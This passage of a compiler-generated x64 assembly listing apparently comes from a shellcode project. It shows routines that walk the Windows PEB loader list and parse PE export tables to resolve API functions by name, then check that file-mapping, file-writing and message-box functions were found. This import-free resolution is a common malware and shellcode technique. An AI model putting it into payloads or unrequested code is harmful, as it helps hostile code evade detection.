	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_FlushViewOfFile@@3P6AHPEBX_K@ZEA, rax ; _FlushViewOfFile
; Line 116
	lea	rdx, OFFSET $SG90693
	mov	rcx, QWORD PTR hLibC$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_memset@@3P6APEAXPEAXH_K@ZEA, rax ; _memset
; Line 120
	cmp	QWORD PTR ?_GetFileSize@@3P6AKPEAXPEAK@ZEA, 0 ; _GetFileSize
	je	$LN8@Initialize
	cmp	QWORD PTR ?_MapViewOfFile@@3P6APEAXPEAXKKK_K@ZEA, 0 ; _MapViewOfFile
	je	$LN8@Initialize
	cmp	QWORD PTR ?_UnmapViewOfFile@@3P6AHPEBX@ZEA, 0 ; _UnmapViewOfFile
	je	$LN8@Initialize
	cmp	QWORD PTR ?_CreateFileMappingA@@3P6APEAXPEAXPEAU_SECURITY_ATTRIBUTES@@KKKPEBD@ZEA, 0 ; _CreateFileMappingA
	je	$LN8@Initialize
	cmp	QWORD PTR ?_ReadFile@@3P6AHPEAX0KPEAKPEAU_OVERLAPPED@@@ZEA, 0 ; _ReadFile
	je	$LN8@Initialize
	cmp	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA, 0 ; _MessageBoxW
	je	$LN8@Initialize
	cmp	QWORD PTR ?_MultiByteToWideChar@@3P6AHIKPEBDHPEA_WH@ZEA, 0 ; _MultiByteToWideChar
	je	$LN8@Initialize
	cmp	QWORD PTR ?_CloseHandle@@3P6AHPEAX@ZEA, 0 ; _CloseHandle
	je	SHORT $LN8@Initialize
	cmp	QWORD PTR ?_strncmp@@3P6AHPEBD0_K@ZEA, 0 ; _strncmp
	je	SHORT $LN8@Initialize
	cmp	QWORD PTR ?_strcpy_s@@3P6AHPEAD_KPEBD@ZEA, 0 ; _strcpy_s
	je	SHORT $LN8@Initialize
	cmp	QWORD PTR ?_ZeroMemory@@3P6AXPEAX_K@ZEA, 0 ; _ZeroMemory
	je	SHORT $LN8@Initialize
	cmp	QWORD PTR ?_SetFilePointer@@3P6AKPEAXJPEAJK@ZEA, 0 ; _SetFilePointer
	je	SHORT $LN8@Initialize
	cmp	QWORD PTR ?_SetEndOfFile@@3P6AHPEAX@ZEA, 0 ; _SetEndOfFile
	je	SHORT $LN8@Initialize
	cmp	QWORD PTR ?_malloc@@3P6APEAX_K@ZEA, 0	; _malloc
	je	SHORT $LN8@Initialize
	cmp	QWORD PTR ?_memcpy@@3P6APEAXPEAXPEBX_K@ZEA, 0 ; _memcpy
	je	SHORT $LN8@Initialize
	cmp	QWORD PTR ?_CreateFileA@@3P6APEAXPEBDKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@ZEA, 0 ; _CreateFileA
	je	SHORT $LN8@Initialize
	cmp	QWORD PTR ?_WriteFile@@3P6AHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@ZEA, 0 ; _WriteFile
	je	SHORT $LN8@Initialize
	cmp	QWORD PTR ?_FlushViewOfFile@@3P6AHPEBX_K@ZEA, 0 ; _FlushViewOfFile
	je	SHORT $LN8@Initialize
	cmp	QWORD PTR ?_memset@@3P6APEAXPEAXH_K@ZEA, 0 ; _memset
	je	SHORT $LN8@Initialize
	mov	DWORD PTR tv224[rsp], 1
	jmp	SHORT $LN9@Initialize
$LN8@Initialize:
	mov	DWORD PTR tv224[rsp], 0
$LN9@Initialize:
	movzx	eax, BYTE PTR tv224[rsp]
$LN1@Initialize:
; Line 123
	add	rsp, 88					; 00000058H
	ret	0
?InitializeFunctions@@YA_NXZ ENDP			; InitializeFunctions
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_func_by_name@@YAPEAXPEAXPEAD@Z
_TEXT	SEGMENT
k$1 = 0
i$2 = 8
exp$ = 16
expAddr$ = 24
funcNamesListRVA$ = 28
namesOrdsListRVA$ = 32
funcsListRVA$ = 36
curr_name$3 = 40
idh$ = 48
exportsDir$ = 56
nt_headers$ = 64
namesCount$ = 72
nameIndex$4 = 80
nameRVA$5 = 88
funcRVA$6 = 96
module$ = 128
func_name$ = 136
?get_func_by_name@@YAPEAXPEAXPEAD@Z PROC		; get_func_by_name, COMDAT
; File C:\Users\6lady\source\shel0101\shell3124\peb-lookup.h
; Line 104
$LN13:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 120				; 00000078H
; Line 105
	mov	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR idh$[rsp], rax
; Line 106
	mov	rax, QWORD PTR idh$[rsp]
	movzx	eax, WORD PTR [rax]
	cmp	eax, 23117				; 00005a4dH
	je	SHORT $LN8@get_func_b
; Line 107
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN8@get_func_b:
; Line 109
	mov	rax, QWORD PTR idh$[rsp]
	movsxd	rax, DWORD PTR [rax+60]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR nt_headers$[rsp], rax
; Line 110
	mov	eax, 8
	imul	rax, rax, 0
	mov	rcx, QWORD PTR nt_headers$[rsp]
	lea	rax, QWORD PTR [rcx+rax+136]
	mov	QWORD PTR exportsDir$[rsp], rax
; Line 111
	mov	rax, QWORD PTR exportsDir$[rsp]
	cmp	DWORD PTR [rax], 0
	jne	SHORT $LN9@get_func_b
; Line 112
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN9@get_func_b:
; Line 115
	mov	rax, QWORD PTR exportsDir$[rsp]
	mov	eax, DWORD PTR [rax]
	mov	DWORD PTR expAddr$[rsp], eax
; Line 116
	mov	eax, DWORD PTR expAddr$[rsp]
	add	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR exp$[rsp], rax
; Line 117
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+24]
	mov	QWORD PTR namesCount$[rsp], rax
; Line 119
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+28]
	mov	DWORD PTR funcsListRVA$[rsp], eax
; Line 120
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+32]
	mov	DWORD PTR funcNamesListRVA$[rsp], eax
; Line 121
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+36]
	mov	DWORD PTR namesOrdsListRVA$[rsp], eax
; Line 124
	mov	QWORD PTR i$2[rsp], 0
	jmp	SHORT $LN4@get_func_b
$LN2@get_func_b:
	mov	rax, QWORD PTR i$2[rsp]
	inc	rax
	mov	QWORD PTR i$2[rsp], rax
$LN4@get_func_b:
	mov	rax, QWORD PTR namesCount$[rsp]
	cmp	QWORD PTR i$2[rsp], rax
	jae	$LN3@get_func_b
; Line 125
	mov	eax, DWORD PTR funcNamesListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR nameRVA$5[rsp], rax
; Line 126
	mov	eax, DWORD PTR namesOrdsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	QWORD PTR nameIndex$4[rsp], rax
; Line 127
	mov	eax, DWORD PTR funcsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR nameIndex$4[rsp]
	movzx	ecx, WORD PTR [rcx]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR funcRVA$6[rsp], rax
; Line 129
	mov	rax, QWORD PTR nameRVA$5[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR curr_name$3[rsp], rax
; Line 130
	mov	QWORD PTR k$1[rsp], 0
; Line 131
	mov	QWORD PTR k$1[rsp], 0
	jmp	SHORT $LN7@get_func_b
$LN5@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	inc	rax
	mov	QWORD PTR k$1[rsp], rax
$LN7@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
; Line 132
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	mov	rcx, QWORD PTR k$1[rsp]
	mov	rdx, QWORD PTR curr_name$3[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	movsx	ecx, BYTE PTR [rcx]
	cmp	eax, ecx
	je	SHORT $LN10@get_func_b
	jmp	SHORT $LN6@get_func_b
$LN10@get_func_b:
; Line 133
	jmp	SHORT $LN5@get_func_b
$LN6@get_func_b:
; Line 134
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
; Line 136
	mov	rax, QWORD PTR funcRVA$6[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	jmp	SHORT $LN1@get_func_b
$LN11@get_func_b:
; Line 138
	jmp	$LN2@get_func_b
$LN3@get_func_b:
; Line 139
	xor	eax, eax
$LN1@get_func_b:
; Line 140
	add	rsp, 120				; 00000078H
	ret	0
?get_func_by_name@@YAPEAXPEAXPEAD@Z ENDP		; get_func_by_name
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_module_by_name@@YAPEAXPEA_W@Z
_TEXT	SEGMENT
i$1 = 0
tv136 = 8
tv155 = 10
c1$2 = 12
c2$3 = 16
curr_name$4 = 24
curr_module$ = 32
tv132 = 40
tv151 = 44
peb$ = 48
ldr$ = 56
Flink$ = 64
list$ = 72
module_name$ = 128
?get_module_by_name@@YAPEAXPEA_W@Z PROC			; get_module_by_name, COMDAT
; File C:\Users\6lady\source\shel0101\shell3124\peb-lookup.h
; Line 69
$LN16:
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 104				; 00000068H
; Line 70
	mov	QWORD PTR peb$[rsp], 0
; Line 72
	mov	rax, QWORD PTR gs:[96]
	mov	QWORD PTR peb$[rsp], rax
; Line 76
	mov	rax, QWORD PTR peb$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR ldr$[rsp], rax
; Line 77
	lea	rax, QWORD PTR list$[rsp]
	mov	rcx, QWORD PTR ldr$[rsp]
	mov	rdi, rax
	lea	rsi, QWORD PTR [rcx+16]
	mov	ecx, 16
	rep movsb
; Line 79
	mov	rax, QWORD PTR list$[rsp]
	mov	QWORD PTR Flink$[rsp], rax
; Line 80
	mov	rax, QWORD PTR Flink$[rsp]
	mov	QWORD PTR curr_module$[rsp], rax
$LN15@get_module:
$LN2@get_module:
; Line 82
	cmp	QWORD PTR curr_module$[rsp], 0
	je	$LN3@get_module
	mov	rax, QWORD PTR curr_module$[rsp]
	cmp	QWORD PTR [rax+48], 0
	je	$LN3@get_module
; Line 83
	mov	rax, QWORD PTR curr_module$[rsp]
	cmp	QWORD PTR [rax+96], 0
	jne	SHORT $LN7@get_module
	jmp	SHORT $LN2@get_module
$LN7@get_module:
; Line 84
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax+96]
	mov	QWORD PTR curr_name$4[rsp], rax
; Line 86
	mov	QWORD PTR i$1[rsp], 0
; Line 87
	mov	QWORD PTR i$1[rsp], 0
	jmp	SHORT $LN6@get_module
$LN4@get_module:
	mov	rax, QWORD PTR i$1[rsp]
	inc	rax
	mov	QWORD PTR i$1[rsp], rax
$LN6@get_module:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	$LN5@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	$LN5@get_module
; Line 89
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN11@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN11@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv132[rsp], eax
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv132[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv132[rsp]
	mov	WORD PTR tv136[rsp], ax
	jmp	SHORT $LN12@get_module
$LN11@get_module:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv136[rsp], ax
$LN12@get_module:
	movzx	eax, WORD PTR tv136[rsp]
	mov	WORD PTR c1$2[rsp], ax
; Line 90
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN13@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN13@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv151[rsp], eax
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv151[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv151[rsp]
	mov	WORD PTR tv155[rsp], ax
	jmp	SHORT $LN14@get_module
$LN13@get_module:
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv155[rsp], ax
$LN14@get_module:
	movzx	eax, WORD PTR tv155[rsp]
	mov	WORD PTR c2$3[rsp], ax
; Line 91
	movzx	eax, WORD PTR c1$2[rsp]
	movzx	ecx, WORD PTR c2$3[rsp]
	cmp	eax, ecx
	je	SHORT $LN8@get_module
	jmp	SHORT $LN5@get_module
$LN8@get_module:
; Line 92
	jmp	$LN4@get_module
$LN5@get_module:
; Line 93
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
; Line 95
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax+48]
	jmp	SHORT $LN1@get_module
$LN9@get_module:
; Line 98
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR curr_module$[rsp], rax
; Line 99
	jmp	$LN15@get_module
$LN3@get_module:
; Line 100
	xor	eax, eax
$LN1@get_module:
; Line 101
	add	rsp, 104				; 00000068H
	pop	rdi
	pop	rsi
	ret	0
?get_module_by_name@@YAPEAXPEA_W@Z ENDP			; get_module_by_name
_TEXT	ENDS
END
